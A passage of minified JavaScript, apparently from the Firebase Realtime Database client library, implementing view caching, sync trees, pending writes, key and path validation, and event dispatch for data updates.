u}(e.writeTree,e.treePath,t,n,r,i,o)}(this.writes_,r,t,1,n,e)).length?null:e[0]},wi);function wi(e,t,n){void 0===n&&(n=null),this.writes_=e,this.viewCache_=t,this.optCompleteServerCache_=n}function Ci(e,t,n,r,i,o){var a=t.eventCache;if(null!=ci(r,n))return t;var s,u,l,h,c,p=void 0;return c=Dt(n)?(f(t.serverCache.isFullyInitialized(),"If change path is empty, we must have complete server data"),t.serverCache.isFiltered()?(s=li(r,(s=Vr(t))instanceof Dn?s:Dn.EMPTY_NODE),e.filter.updateFullNode(t.eventCache.getNode(),s,o)):(u=ui(r,Vr(t)),e.filter.updateFullNode(t.eventCache.getNode(),u,o))):".priority"===(u=St(n))?(f(1===kt(n),"Can't have a priority with additional path components"),null!=(h=hi(r,n,l=a.getNode(),p=t.serverCache.getNode()))?e.filter.updatePriority(l,h):a.getNode()):(l=Pt(n),h=void 0,null!=(h=a.isCompleteForChild(u)?(p=t.serverCache.getNode(),null!=(p=hi(r,n,a.getNode(),p))?a.getNode().getImmediateChild(u).updateChild(l,p):a.getNode().getImmediateChild(u)):pi(r,u,t.serverCache))?e.filter.updateChild(a.getNode(),u,h,l,i,o):a.getNode()),Ur(t,c,a.isFullyInitialized()||Dt(n),e.filter.filtersNodes())}function bi(e,t,n,r,i,o,a,s){var u=t.serverCache,l=a?e.filter:e.filter.getIndexedFilter();if(Dt(n))c=l.updateFullNode(u.getNode(),r,null);else if(l.filtersNodes()&&!u.isFiltered())var h=u.getNode().updateChild(n,r),c=l.updateFullNode(u.getNode(),h,null);else{if(a=St(n),!u.isCompleteForPath(n)&&1<kt(n))return t;h=Pt(n),r=u.getNode().getImmediateChild(a).updateChild(h,r),c=".priority"===a?l.updatePriority(u.getNode(),r):l.updateChild(u.getNode(),a,r,h,gi,null)}return Ci(e,l=Br(t,c,u.isFullyInitialized()||Dt(n),l.filtersNodes()),n,i,new mi(i,l,o),s)}function Ti(e,t,n,r,i,o,a){var s,u,l=t.eventCache,h=new mi(i,t,o);return Dt(n)?(u=e.filter.updateFullNode(t.eventCache.getNode(),r,a),Ur(t,u,!0,e.filter.filtersNodes())):".priority"===(s=St(n))?(u=e.filter.updatePriority(t.eventCache.getNode(),r),Ur(t,u,l.isFullyInitialized(),l.isFiltered())):(i=Pt(n),o=l.getNode().getImmediateChild(s),u=void 0,u=Dt(i)?r:null!=(n=h.getCompleteChild(s))?".priority"===Nt(i)&&n.getChild(Rt(i)).isEmpty()?n:n.updateChild(i,r):Dn.EMPTY_NODE,o.equals(u)?t:Ur(t,e.filter.updateChild(l.getNode(),s,u,i,h,a),l.isFullyInitialized(),e.filter.filtersNodes()))}function Ei(e,t){return e.eventCache.isCompleteForChild(t)}function Ii(e,t,n){return n.foreach((function(e,n){t=t.updateChild(e,n)})),t}function Si(e,t,n,r,i,o,a,s){if(t.serverCache.getNode().isEmpty()&&!t.serverCache.isFullyInitialized())return t;var u=t,l=(r=Dt(n)?r:new Hr(null).setTree(n,r),t.serverCache.getNode());return r.children.inorderTraversal((function(n,r){l.hasChild(n)&&(r=Ii(0,t.serverCache.getNode().getImmediateChild(n),r),u=bi(e,u,new Tt(n),r,i,o,a,s))})),r.children.inorderTraversal((function(n,r){var h=!t.serverCache.isCompleteForChild(n)&&void 0===r.value;l.hasChild(n)||h||(r=Ii(0,t.serverCache.getNode().getImmediateChild(n),r),u=bi(e,u,new Tt(n),r,i,o,a,s))})),u}var ki,Pi=(Object.defineProperty(Ni.prototype,"query",{get:function(){return this.query_},enumerable:!1,configurable:!0}),Ni);function Ni(e,t){this.query_=e,this.eventRegistrations_=[];var n=this.query_._queryParams,r=new er(n.getIndex()),i=(o=n).loadsAllData()?new er(o.getIndex()):new(o.hasLimit()?ir:nr)(o);this.processor_={filter:i};e=t.serverCache,n=t.eventCache;var o=r.updateFullNode(Dn.EMPTY_NODE,e.getNode(),null);t=i.updateFullNode(Dn.EMPTY_NODE,n.getNode(),null),r=new Lr(o,e.isFullyInitialized(),r.filtersNodes()),i=new Lr(t,n.isFullyInitialized(),i.filtersNodes());this.viewCache_=jr(i,r),this.eventGenerator_=new qr(this.query_)}function xi(e){return 0===e.eventRegistrations_.length}function Ri(e,t,n){var r,i=[];if(n&&(f(null==t,"A cancel should cancel all event registrations."),r=e.query._path,e.eventRegistrations_.forEach((function(e){(e=e.createCancelEvent(n,r))&&i.push(e)}))),t){for(var o=[],a=0;a<e.eventRegistrations_.length;++a){var s=e.eventRegistrations_[a];if(s.matches(t)){if(t.hasAnyCallback()){o=o.concat(e.eventRegistrations_.slice(a+1));break}}else o.push(s)}e.eventRegistrations_=o}else e.eventRegistrations_=[];return i}function Oi(e,t,n,r){t.type===Tr.MERGE&&null!==t.source.queryId&&(f(Vr(e.viewCache_),"We should always have a full cache before handling merges"),f(zr(e.viewCache_),"Missing event cache, even though we have a server cache"));var i=e.viewCache_;t=function(e,t,n,r,i){var o,a,s,u,l,h,c,p,d=new _i;if(n.type===Tr.OVERWRITE)var y=n,v=y.source.fromUser?Ti(e,t,y.path,y.snap,r,i,d):(f(y.source.fromServer,"Unknown source."),o=y.source.tagged||t.serverCache.isFiltered()&&!Dt(y.path),bi(e,t,y.path,y.snap,r,i,o,d));else if(n.type===Tr.MERGE){var g=n;v=g.source.fromUser?(a=e,s=t,u=g.path,y=g.children,l=r,h=i,c=d,p=s,y.foreach((function(e,t){e=Ot(u,e),Ei(s,St(e))&&(p=Ti(a,p,e,t,l,h,c))})),y.foreach((function(e,t){e=Ot(u,e),Ei(s,St(e))||(p=Ti(a,p,e,t,l,h,c))})),p):(f(g.source.fromServer,"Unknown source."),o=g.source.tagged||t.serverCache.isFiltered(),Si(e,t,g.path,g.children,r,i,o,d))}else if(n.type===Tr.ACK_USER_WRITE){var m=n;v=m.revert?function(e,t,n,r,i,o){var a;if(null!=ci(r,n))return t;var s,u,l=new mi(r,t,i),h=t.eventCache.getNode();return i=void 0,Dt(n)||".priority"===St(n)?(u=void 0,u=t.serverCache.isFullyInitialized()?ui(r,Vr(t)):(s=t.serverCache.getNode(),f(s instanceof Dn,"serverChildren would be complete if leaf node"),li(r,s)),i=e.filter.updateFullNode(h,u,o)):(null==(u=pi(r,s=St(n),t.serverCache))&&t.serverCache.isCompleteForChild(s)&&(u=h.getImmediateChild(s)),(i=null!=u?e.filter.updateChild(h,s,u,Pt(n),l,o):t.eventCache.getNode().hasChild(s)?e.filter.updateChild(h,s,Dn.EMPTY_NODE,Pt(n),l,o):h).isEmpty()&&t.serverCache.isFullyInitialized()&&(a=ui(r,Vr(t))).isLeafNode()&&(i=e.filter.updateFullNode(i,a,o))),a=t.serverCache.isFullyInitialized()||null!=ci(r,It()),Ur(t,i,a,e.filter.filtersNodes())}(e,t,m.path,r,i,d):function(e,t,n,r,i,o,a){if(null!=ci(i,n))return t;var s=t.serverCache.isFiltered(),u=t.serverCache;if(null!=r.value){if(Dt(n)&&u.isFullyInitialized()||u.isCompleteForPath(n))return bi(e,t,n,u.getNode().getChild(n),i,o,s,a);if(Dt(n)){var l=new Hr(null);return u.getNode().forEachChild(tn,(function(e,t){l=l.set(new Tt(e),t)})),Si(e,t,n,l,i,o,s,a)}return t}var h=new Hr(null);return r.foreach((function(e,t){var r=Ot(n,e);u.isCompleteForPath(r)&&(h=h.set(e,u.getNode().getChild(r)))})),Si(e,t,n,h,i,o,s,a)}(e,t,m.path,m.affectedTree,r,i,d)}else{if(n.type!==Tr.LISTEN_COMPLETE)throw _("Unknown operation type: "+n.type);m=e,i=n.path,e=r,n=d,v=Ci(m,r=Br(t,(r=t.serverCache).getNode(),r.isFullyInitialized()||Dt(i),r.isFiltered()),i,e,gi,n)}return function(e,t,n){var r,i,o=t.eventCache;o.isFullyInitialized()&&(r=o.getNode().isLeafNode()||o.getNode().isEmpty(),i=zr(e),(0<n.length||!e.eventCache.isFullyInitialized()||r&&!o.getNode().equals(i)||!o.getNode().getPriority().equals(i.getPriority()))&&n.push($n(zr(t))))}(t,v,d=d.getChanges()),{viewCache:v,changes:d}}(e.processor_,i,t,n,r);return n=e.processor_,r=t.viewCache,f(r.eventCache.getNode().isIndexed(n.filter.getIndex()),"Event snap not indexed"),f(r.serverCache.getNode().isIndexed(n.filter.getIndex()),"Server snap not indexed"),f(t.viewCache.serverCache.isFullyInitialized()||!i.serverCache.isFullyInitialized(),"Once a server snap is complete, it should never go back"),e.viewCache_=t.viewCache,Di(e,t.changes,t.viewCache.eventCache.getNode(),null)}function Di(e,t,n,r){return r=r?[r]:e.eventRegistrations_,function(e,t,n,r){var i=[],o=[];return t.forEach((function(t){var n;"child_changed"===t.type&&e.index_.indexedValueChanged(t.oldSnap,t.snapshotNode)&&o.push((n=t.childName,{type:"child_moved",snapshotNode:t.snapshotNode,childName:n}))})),Wr(e,i,"child_removed",t,r,n),Wr(e,i,"child_added",t,r,n),Wr(e,i,"child_moved",o,r,n),Wr(e,i,"child_changed",t,r,n),Wr(e,i,"value",t,r,n),i}(e.eventGenerator_,t,n,r)}var Ai,Li=function(){this.views=new Map};function Mi(e,t,n,r){var i,o,a=t.source.queryId;if(null!==a){var u=e.views.get(a);return f(null!=u,"SyncTree gave us an op for an invalid query."),Oi(u,t,n,r)}var l=[];try{for(var h=s(e.views.values()),c=h.next();!c.done;c=h.next())u=c.value,l=l.concat(Oi(u,t,n,r))}catch(e){i={error:e}}finally{try{c&&!c.done&&(o=h.return)&&o.call(h)}finally{if(i)throw i.error}}return l}function Fi(e,t,n,r,i){var o=t._queryIdentifier;return(e=e.views.get(o))?e:(e=!1,e=!!(o=ui(n,i?r:null))||(o=r instanceof Dn?li(n,r):Dn.EMPTY_NODE,!1),i=jr(new Lr(o,e,!1),new Lr(r,i,!1)),new Pi(t,i))}function qi(e){var t,n,r=[];try{for(var i=s(e.views.values()),o=i.next();!o.done;o=i.next()){var a=o.value;a.query._queryParams.loadsAllData()||r.push(a)}}catch(e){t={error:e}}finally{try{o&&!o.done&&(n=i.return)&&n.call(i)}finally{if(t)throw t.error}}return r}function Wi(e,t){var n,r,i,o,a,u=null;try{for(var l=s(e.views.values()),h=l.next();!h.done;h=l.next()){var c=h.value;u=u||(o=t,a=void 0,(a=Vr((i=c).viewCache_))&&(i.query._queryParams.loadsAllData()||!Dt(o)&&!a.getImmediateChild(St(o)).isEmpty())?a.getChild(o):null)}}catch(e){n={error:e}}finally{try{h&&!h.done&&(r=l.return)&&r.call(l)}finally{if(n)throw n.error}}return u}function ji(e,t){return t._queryParams.loadsAllData()?zi(e):(t=t._queryIdentifier,e.views.get(t))}function Ui(e,t){return null!=ji(e,t)}function Bi(e){return null!=zi(e)}function zi(e){var t,n;try{for(var r=s(e.views.values()),i=r.next();!i.done;i=r.next()){var o=i.value;if(o.query._queryParams.loadsAllData())return o}}catch(e){t={error:e}}finally{try{i&&!i.done&&(n=r.return)&&n.call(r)}finally{if(t)throw t.error}}return null}var Vi=1,Hi=function(e){this.listenProvider_=e,this.syncPointTree_=new Hr(null),this.pendingWriteTree_={visibleWrites:Yr.empty(),allWrites:[],lastWriteId:-1},this.tagToQueryMap=new Map,this.queryToTagMap=new Map};function Qi(e,t,n,r,i){var o,a,s,u;return o=e.pendingWriteTree_,a=t,s=n,u=i,f((r=r)>o.lastWriteId,"Stacking an older write on top of newer ones"),o.allWrites.push({path:a,snap:s,writeId:r,visible:u=void 0===u||u}),u&&(o.visibleWrites=Gr(o.visibleWrites,a,s)),o.lastWriteId=r,i?Xi(e,new Rr({fromUser:!0,fromServer:!1,queryId:null,tagged:!1},t,n)):[]}function Yi(e,t,n){void 0===n&&(n=!1);var r=function(e,t){for(var n=0;n<e.allWrites.length;n++){var r=e.allWrites[n];if(r.writeId===t)return r}return null}(e.pendingWriteTree_,t);if(function(e,t){var n=e.allWrites.findIndex((function(e){return e.writeId===t}));f(0<=n,"removeWrite called with nonexistent writeId.");var r=e.allWrites[n];e.allWrites.splice(n,1);for(var i,o=r.visible,a=!1,s=e.allWrites.length-1;o&&0<=s;){var u=e.allWrites[s];u.visible&&(n<=s&&function(e,t){if(e.snap)return Ft(e.path,t);for(var n in e.children)if(e.children.hasOwnProperty(n)&&Ft(Ot(e.path,n),t))return!0;return!1}(u,r.path)?o=!1:Ft(r.path,u.path)&&(a=!0)),s--}return!!o&&(a?((i=e).visibleWrites=ai(i.allWrites,oi,It()),0<i.allWrites.length?i.lastWriteId=i.allWrites[i.allWrites.length-1].writeId:i.lastWriteId=-1):r.snap?e.visibleWrites=Jr(e.visibleWrites,r.path):Oe(r.children,(function(t){e.visibleWrites=Jr(e.visibleWrites,Ot(r.path,t))})),!0)}(e.pendingWriteTree_,t)){var i=new Hr(null);return null!=r.snap?i=i.set(It(),!0):Oe(r.children,(function(e){i=i.set(new Tt(e),!0)})),Xi(e,new kr(r.path,i,n))}return[]}function Ki(e,t,n){return Xi(e,new Rr({fromUser:!1,fromServer:!0,queryId:null,tagged:!1},t,n))}function Gi(e,t,n,r){var i=t._path,o=e.syncPointTree_.get(i),a=[];if(o&&("default"===t._queryIdentifier||Ui(o,t))){var l=function(e,t,n,r){var i,o,a=t._queryIdentifier,l=[],h=[],c=Bi(e);if("default"===a)try{for(var p=s(e.views.entries()),d=p.next();!d.done;d=p.next()){var _=u(d.value,2),y=_[0],v=_[1];h=h.concat(Ri(v,n,r)),xi(v)&&(e.views.delete(y),v.query._queryParams.loadsAllData()||l.push(v.query))}}catch(e){i={error:e}}finally{try{d&&!d.done&&(o=p.return)&&o.call(p)}finally{if(i)throw i.error}}else(v=e.views.get(a))&&(h=h.concat(Ri(v,n,r)),xi(v)&&(e.views.delete(a),v.query._queryParams.loadsAllData()||l.push(v.query)));return c&&!Bi(e)&&l.push((f(ki,"Reference.ts has not been loaded"),new ki(t._repo,t._path))),{removed:l,events:h}}(o,t,n,r);if(0===o.views.size&&(e.syncPointTree_=e.syncPointTree_.remove(i)),n=l.removed,a=l.events,o=-1!==n.findIndex((function(e){return e._queryParams.loadsAllData()})),l=e.syncPointTree_.findOnPath(i,(function(e,t){return Bi(t)})),o&&!l&&!(i=e.syncPointTree_.subtree(i)).isEmpty())for(var h=i.fold((function(e,t,n){if(t&&Bi(t))return[zi(t)];var r=[];return t&&(r=qi(t)),Oe(n,(function(e,t){r=r.concat(t)})),r})),c=0;c<h.length;++c){var p=(d=h[c]).query,d=eo(e,d);e.listenProvider_.startListening(ao(p),to(e,p),d.hashFn,d.onComplete)}!l&&0<n.length&&!r&&(o?e.listenProvider_.stopListening(ao(t),null):n.forEach((function(t){var n=e.queryToTagMap.get(no(t));e.listenProvider_.stopListening(ao(t),n)}))),function(e,t){for(var n=0;n<t.length;++n){var r,i=t[n];i._queryParams.loadsAllData()||(r=no(i),i=e.queryToTagMap.get(r),e.queryToTagMap.delete(r),e.tagToQueryMap.delete(i))}}(e,n)}return a}function $i(e,t,n){var r=t._path,i=null,o=!1;e.syncPointTree_.foreachOnPath(r,(function(e,t){e=At(e,r),i=i||Wi(t,e),o=o||Bi(t)}));var a=e.syncPointTree_.get(r);a?(o=o||Bi(a),i=i||Wi(a,It())):(a=new Li,e.syncPointTree_=e.syncPointTree_.set(r,a)),null!=i?h=!0:(h=!1,i=Dn.EMPTY_NODE,e.syncPointTree_.subtree(r).foreachChild((function(e,t){(t=Wi(t,It()))&&(i=i.updateImmediateChild(e,t))})));var s,u,l=Ui(a,t);l||t._queryParams.loadsAllData()||(s=no(t),f(!e.queryToTagMap.has(s),"View does not exist, but we have a tag"),u=Vi++,e.queryToTagMap.set(s,u),e.tagToQueryMap.set(u,s));var h=function(e,t,n,r,i,o){var a;return o=Fi(e,t,r,i,o),e.views.has(t._queryIdentifier)||e.views.set(t._queryIdentifier,o),o.eventRegistrations_.push(n),t=n,o=(n=o).viewCache_.eventCache,a=[],o.getNode().isLeafNode()||o.getNode().forEachChild(bn,(function(e,t){a.push(Jn(e,t))})),o.isFullyInitialized()&&a.push($n(o.getNode())),Di(n,a,o.getNode(),t)}(a,t,n,ii(e.pendingWriteTree_,r),i,h);return l||o||(a=ji(a,t),h=h.concat(function(e,t,n){var r=t._path,i=to(e,t);n=eo(e,n),n=e.listenProvider_.startListening(ao(t),i,n.hashFn,n.onComplete),r=e.syncPointTree_.subtree(r);if(i)f(!Bi(r.value),"If we're adding a query, it shouldn't be shadowed");else for(var o=r.fold((function(e,t,n){if(!Dt(e)&&t&&Bi(t))return[zi(t).query];var r=[];return t&&(r=r.concat(qi(t).map((function(e){return e.query})))),Oe(n,(function(e,t){r=r.concat(t)})),r})),a=0;a<o.length;++a){var s=o[a];e.listenProvider_.stopListening(ao(s),to(e,s))}return n}(e,t,a))),h}function Ji(e,t,n){var r=e.pendingWriteTree_;e=e.syncPointTree_.findOnPath(t,(function(e,n){if(e=Wi(n,At(e,t)))return e}));return si(r,t,e,n,!0)}function Xi(e,t){return function e(t,n,r,i){if(Dt(t.path))return Zi(t,n,r,i);var o=n.get(It());null==r&&null!=o&&(r=Wi(o,It()));var a=[],s=St(t.path),u=t.operationForChild(s),l=n.children.get(s);return l&&u&&(n=r?r.getImmediateChild(s):null,s=di(i,s),a=a.concat(e(u,l,n,s))),o?a.concat(Mi(o,t,i,r)):a}(t,e.syncPointTree_,null,ii(e.pendingWriteTree_,It()))}function Zi(e,t,n,r){var i=t.get(It());null==n&&null!=i&&(n=Wi(i,It()));var o=[];return t.children.inorderTraversal((function(t,i){var a=n?n.getImmediateChild(t):null,s=di(r,t);(t=e.operationForChild(t))&&(o=o.concat(Zi(t,i,a,s)))})),o=i?o.concat(Mi(i,e,r,n)):o}function eo(e,t){var n=t.query,r=to(e,n);return{hashFn:function(){return(t.viewCache_.serverCache.getNode()||Dn.EMPTY_NODE).hash()},onComplete:function(t){if("ok"===t)return r?function(e,t,n){var r=ro(e,n);return r?(r=(n=io(r)).path,n=n.queryId,t=At(r,t),oo(e,r,new Nr(Sr(n),t))):[]}(e,n._path,r):(i=n._path,Xi(e,new Nr({fromUser:!1,fromServer:!0,queryId:null,tagged:!1},i)));var i=(i="Unknown Error","too_big"===(t=t)?i="The data requested exceeds the maximum size that can be accessed with a single request.":"permission_denied"===t?i="Client doesn't have permission to access the desired data.":"unavailable"===t&&(i="The service is unavailable"),(i=new Error(t+" at "+n._path.toString()+": "+i)).code=t.toUpperCase(),i);return Gi(e,n,null,i)}}}function to(e,t){return t=no(t),e.queryToTagMap.get(t)}function no(e){return e._path.toString()+"$"+e._queryIdentifier}function ro(e,t){return e.tagToQueryMap.get(t)}function io(e){var t=e.indexOf("$");return f(-1!==t&&t<e.length-1,"Bad queryKey."),{queryId:e.substr(t+1),path:new Tt(e.substr(0,t))}}function oo(e,t,n){var r=e.syncPointTree_.get(t);return f(r,"Missing sync point for query tag that we're tracking"),Mi(r,n,ii(e.pendingWriteTree_,t),null)}function ao(e){return e._queryParams.loadsAllData()&&!e._queryParams.isDefault()?(f(Ai,"Reference.ts has not been loaded"),new Ai(e._repo,e._path)):e}var so=(uo.prototype.getImmediateChild=function(e){return new uo(this.node_.getImmediateChild(e))},uo.prototype.node=function(){return this.node_},uo);function uo(e){this.node_=e}var lo=(ho.prototype.getImmediateChild=function(e){return e=Ot(this.path_,e),new ho(this.syncTree_,e)},ho.prototype.node=function(){return Ji(this.syncTree_,this.path_)},ho);function ho(e,t){this.syncTree_=e,this.path_=t}var co=function(e,t,n){return e&&"object"==typeof e?(f(".sv"in e,"Unexpected leaf node or priority contents"),"string"==typeof e[".sv"]?po(e[".sv"],t,n):"object"==typeof e[".sv"]?fo(e[".sv"],t):void f(!1,"Unexpected server value: "+JSON.stringify(e,null,2))):e},po=function(e,t,n){if("timestamp"===e)return n.timestamp;f(!1,"Unexpected server value: "+e)},fo=function(e,t,n){return e.hasOwnProperty("increment")||f(!1,"Unexpected server value: "+JSON.stringify(e,null,2)),"number"!=typeof(e=e.increment)&&f(!1,"Unexpected increment value: "+e),t=t.node(),f(null!=t,"Expected ChildrenNode.EMPTY_NODE for nulls"),t.isLeafNode()?"number"!=typeof(t=t.getValue())?e:t+e:e},_o=function(e,t,n,r){return vo(t,new lo(n,e),r)},yo=function(e,t,n){return vo(e,new so(t),n)};function vo(e,t,n){var r=e.getPriority().val(),i=co(r,t.getImmediateChild(".priority"),n);if(e.isLeafNode()){var o=e;return(r=co(o.getValue(),t,n))!==o.getValue()||i!==o.getPriority().val()?new mn(r,Fn(i)):e}var a=e=e;return i!==e.getPriority().val()&&(a=a.updatePriority(new mn(i))),e.forEachChild(bn,(function(e,r){var i=vo(r,t.getImmediateChild(e),n);i!==r&&(a=a.updateImmediateChild(e,i))})),a}var go=function(e,t,n){void 0===t&&(t=null),void 0===n&&(n={children:{},childCount:0}),this.name=e=void 0===e?"":e,this.parent=t,this.node=n};function mo(e,t){for(var n=t instanceof Tt?t:new Tt(t),r=e,i=St(n);null!==i;){var o=O(r.node.children,i)||{children:{},childCount:0};r=new go(i,r,o),i=St(n=Pt(n))}return r}function wo(e){return e.node.value}function Co(e,t){e.node.value=t,Io(e)}function bo(e){return 0<e.node.childCount}function To(e,t){Oe(e.node.children,(function(n,r){t(new go(n,e,r))}))}function Eo(e){return new Tt(null===e.parent?e.name:Eo(e.parent)+"/"+e.name)}function Io(e){var t,n,r,i;null!==e.parent&&(t=e.parent,n=e.name,i=function(e){return void 0===wo(e)&&!bo(e)}(r=e),e=R(t.node.children,n),i&&e?(delete t.node.children[n],t.node.childCount--,Io(t)):i||e||(t.node.children[n]=r.node,t.node.childCount++,Io(t)))}function So(e){return"string"==typeof e&&0!==e.length&&!Ro.test(e)}function ko(e){return"string"==typeof e&&0!==e.length&&!Oo.test(e)}function Po(e,t,n,r){if(!r||void 0!==t){var i=q(e,"values");if(!t||"object"!=typeof t||Array.isArray(t))throw new Error(i+" must be an object containing the children to replace.");var o=[];Oe(t,(function(e,t){if(e=new Tt(e),Mo(i,t,Ot(n,e)),".priority"===Nt(e)&&!Ao(t))throw new Error(i+"contains an invalid value for '"+e.toString()+"', which must be a valid Firebase priority (a string, finite number, server value, or null).");o.push(e)})),function(e,t){for(var n=0;n<t.length;n++)for(var r,i=xt(r=t[n]),o=0;o<i.length;o++)if((".priority"!==i[o]||o!==i.length-1)&&!So(i[o]))throw new Error(e+"contains an invalid key ("+i[o]+") in path "+r.toString()+'. Keys must be non-empty strings and can\'t contain ".", "#", "$", "/", "[", or "]"');t.sort(Lt);var a=null;for(n=0;n<t.length;n++){if(r=t[n],null!==a&&Ft(a,r))throw new Error(e+"contains a path "+a.toString()+" that is ancestor of another path "+r.toString());a=r}}(i,o)}}function No(e,t,n){if(!n||void 0!==t){if(pe(t))throw new Error(q(e,"priority")+"is "+t.toString()+", but must be a valid Firebase priority (a string, finite number, server value, or null).");if(!Ao(t))throw new Error(q(e,"priority")+"must be a valid Firebase priority (a string, finite number, server value, or null).")}}function xo(e,t,n,r){if(!(r&&void 0===n||So(n)))throw new Error(q(e,t)+'was an invalid key = "'+n+'".  Firebase keys must be non-empty strings and can\'t contain ".", "#", "$", "/", "[", or "]").')}var Ro=/[\[\].#$\/\u0000-\u001F\u007F]/,Oo=/[\[\].#$\u0000-\u001F\u007F]/,Do=10485760,Ao=function(e){return null===e||"string"==typeof e||"number"==typeof e&&!pe(e)||e&&"object"==typeof e&&R(e,".sv")},Lo=function(e,t,n,r){r&&void 0===t||Mo(q(e,"value"),t,n)},Mo=function(e,t,n){var r=n instanceof Tt?new qt(n,e):n;if(void 0===t)throw new Error(e+"contains undefined "+jt(r));if("function"==typeof t)throw new Error(e+"contains a function "+jt(r)+" with contents = "+t.toString());if(pe(t))throw new Error(e+"contains "+t.toString()+" "+jt(r));if("string"==typeof t&&t.length>Do/3&&U(t)>Do)throw new Error(e+"contains a string greater than "+Do+" utf8 bytes "+jt(r)+" ('"+t.substring(0,50)+"...')");if(t&&"object"==typeof t){var i=!1,o=!1;if(Oe(t,(function(t,n){if(".value"===t)i=!0;else if(".priority"!==t&&".sv"!==t&&(o=!0,!So(t)))throw new Error(e+" contains an invalid key ("+t+") "+jt(r)+'.  Keys must be non-empty strings and can\'t contain ".", "#", "$", "/", "[", or "]"');var a;a=t,0<(t=r).parts_.length&&(t.byteLength_+=1),t.parts_.push(a),t.byteLength_+=U(a),Wt(t),Mo(e,n,r),n=(t=r).parts_.pop(),t.byteLength_-=U(n),0<t.parts_.length&&--t.byteLength_})),i&&o)throw new Error(e+' contains ".value" child '+jt(r)+" in addition to actual children.")}},Fo=function(e,t,n,r){if(!(r&&void 0===n||ko(n)))throw new Error(q(e,t)+'was an invalid path = "'+n+'". Paths must be non-empty strings and can\'t contain ".", "#", "$", "[", or "]"')},qo=function(e,t,n,r){n=n&&n.replace(/^\/*\.info(\/|$)/,"/"),Fo(e,t,n,r)},Wo=function(e,t){if(".info"===St(t))throw new Error(e+" failed = Can't modify data under /.info/")},jo=function(e,t){var n=t.path.toString();if("string"!=typeof t.repoInfo.host||0===t.repoInfo.host.length||!So(t.repoInfo.namespace)&&"localhost"!==t.repoInfo.host.split(":")[0]||0!==n.length&&!ko(n=(n=n)&&n.replace(/^\/*\.info(\/|$)/,"/")))throw new Error(q(e,"url")+'must be a valid firebase URL and the path can\'t contain ".", "#", "$", "[", or "]".')},Uo=function(){this.eventLists_=[],this.recursionDepth_=0};function Bo(e,t){for(var n=null,r=0;r<t.length;r++){var i=t[r],o=i.getPath();null===n||Mt(o,n.path)||(e.eventLists_.push(n),n=null),(n=null===n?{events:[],path:o}:n).events.push(i)}n&&e.eventLists_.push(n)}function zo(e,t,n){Bo(e,n),Ho(e,(function(e){return Mt(e,t)}))}function Vo(e,t,n){Bo(e,n),Ho(e,(function(e){return Ft(e,t)||Ft(t,e)}))}function Ho(e,t){e.recursionDepth_++;for(var n=!0,r=0;r<e.eventLists_.length;r++){var i=e.eventLists_[r];i&&(t(i.path)?(function(e){for(var t=0;t<e.events.length;t++){var n,r=e.events[t];null!==r&&(e.events[t]=null,n=r.getEventRunner(),be&&Ee("event: "+r.toString()),We(n))}}(e.eventLists_[r]),e.eventLists_[r]=null):n=!1)}n&&(e.eventLists_=[]),e.recursionDepth_--}var Qo="repo_interrupt",Yo=(Ko.prototype.toString=function(){return(this.repoInfo_.secure?"https://":"http://")+this.repoInfo_.host},Ko);function Ko(e,t,n,r){this.repoInfo_=e,this.forceRestClient_=t,this.authTokenProvider_=n,this.appCheckProvider_=r,this.dataUpdateCount=0,this.statsListener_=null,this.eventQueue_=new Uo,this.nextWriteId_=1,this.interceptServerDataCallback_=null,this.onDisconnect_=gr(),this.transactionQueueTree_=new go,this.persistentConnection_=null,this.key=this.repoInfo_.toURLString()}function Go(e){return e=e.infoData_.getNode(new Tt(".info/serverTimeOffset")).val()||0,(new Date).getTime()+e}function $o(e){return function(e){return(e=e||{}).timestamp=e.timestamp||(new Date).getTime(),e}({timestamp:Go(e)})}function Jo(e,t,n,r,i){e.dataUpdateCount++;var o=new Tt(t);n=e.interceptServerDataCallback_?e.interceptServerDataCallback_(t,n):n;var a,s,u,l,h;t=o;0<(h=i?r?(a=A(n,(function(e){return Fn(e)})),function(e,t,n,r){var i=ro(e,r);return i?(i=(r=io(i)).path,r=r.queryId,t=At(i,t),n=Hr.fromObject(n),oo(e,i,new Dr(Sr(r),t,n))):[]}(e.serverSyncTree_,o,a,i)):(l=Fn(n),a=e.serverSyncTree_,s=o,u=l,null==(i=ro(a,l=i))?[]:(l=io(i),i=l.path,l=l.queryId,s=At(i,s),oo(a,i,new Rr(Sr(l),s,u)))):r?(l=A(n,(function(e){return Fn(e)})),s=e.serverSyncTree_,u=o,r=l,r=Hr.fromObject(l),Xi(s,new Dr({fromUser:!1,fromServer:!0,queryId:null,tagged:!1},u,r))):(n=Fn(n),Ki(e.serverSyncTree_,o,n))).length&&(t=la(e,o)),Vo(e.eventQueue_,t,h)}function Xo(e,t){Zo(e,"connected",t),!1===t&&function(e){oa(e,"onDisconnectEvents");var t=$o(e),n=gr();wr(e.onDisconnect_,It(),(function(r,i){i=_o(r,i,e.serverSyncTree_,t),mr(n,r,i)}));var r=[];wr(n,It(),(function(t,n){r=r.concat(Ki(e.serverSyncTree_,t,n)),t=da(e,t),la(e,t)})),e.onDisconnect_=gr(),Vo(e.eventQueue_,It(),r)}(e)}function Zo(e,t,n){t=new Tt("/.info/"+t),n=Fn(n),e.infoData_.updateSnapshot(t,n),n=Ki(e.infoSyncTree_,t,n),Vo(e.eventQueue_,t,n)}function ea(e){return e.nextWriteId_++}function ta(e,t,n,r,i){oa(e,"set",{path:t.toString(),value:n,priority:r});var o=$o(e),a=(n=Fn(n,r),r=Ji(e.serverSyncTree_,t),o=yo(n,r,o),ea(e));o=Qi(e.serverSyncTree_,t,o,a,!0);Bo(e.eventQueue_,o),e.server_.put(t.toString(),n.val(!0),(function(n,r){var o="ok"===n;o||ke("set at "+t+" failed: "+n),o=Yi(e.serverSyncTree_,a,!o),Vo(e.eventQueue_,t,o),aa(0,i,n,r)})),n=da(e,t),la(e,n),Vo(e.eventQueue_,n,[])}function na(e,t,n,r){var i=Fn(n);e.server_.onDisconnectPut(t.toString(),i.val(!0),(function(n,o){"ok"===n&&mr(e.onDisconnect_,t,i),aa(0,r,n,o)}))}function ra(e,t,n){n=".info"===St(t._path)?Gi(e.infoSyncTree_,t,n):Gi(e.serverSyncTree_,t,n),zo(e.eventQueue_,t._path,n)}function ia(e){e.persistentConnection_&&e.persistentConnection_.interrupt(Qo)}function oa(e){for(var t=[],n=1;n<arguments.length;n++)t[n-1]=arguments[n];var r="";e.persistentConnection_&&(r=e.persistentConnection_.id+":"),Ee.apply(void 0,l([r],u(t)))}function aa(e,t,n,r){t&&We((function(){var e,i;"ok"===n?t(null):(i=e=(n||"error").toUpperCase(),r&&(i+=": "+r),(i=new 